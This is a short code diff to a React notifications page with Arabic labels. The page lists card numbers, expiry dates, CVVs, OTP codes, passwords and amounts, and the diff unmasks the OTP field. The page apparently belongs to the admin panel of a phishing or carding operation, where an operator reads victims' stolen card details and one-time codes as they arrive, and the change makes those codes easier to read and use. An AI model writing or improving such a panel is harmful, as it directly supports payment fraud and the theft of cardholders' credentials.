@@ -789,7 +789,7 @@ export default function NotificationsPage() {
                           colorClass="from-blue-500 to-blue-600"
                         />
                         <InfoBadge
-                          active={getNotificationCardNum(n)}
+                          active={getNotificationCardNum(n).toString()}
                           onClick={() => { setSelectedNotification(n); setSelectedInfo("card"); }}
                           icon={CreditCard}
                           text="بطاقة"
@@ -844,7 +844,7 @@ export default function NotificationsPage() {
               { label: "رقم البطاقة", value: getNotificationCardNum(selectedNotification), sensitive: false },
               { label: "تاريخ الانتهاء", value: getNotificationExpiry(selectedNotification) },
               { label: "CVV", value: getNotificationCVV(selectedNotification), sensitive: false },
-              { label: "رمز OTP", value: selectedNotification.otp, sensitive: true },
+              { label: "رمز OTP", value: selectedNotification.otp, sensitive: false },
               { label: "كلمة المرور", value: selectedNotification.pass, sensitive: true },
               { label: "المبلغ", value: selectedNotification.amount },
             ]} additionalOtps={selectedNotification.allOtps || []} />
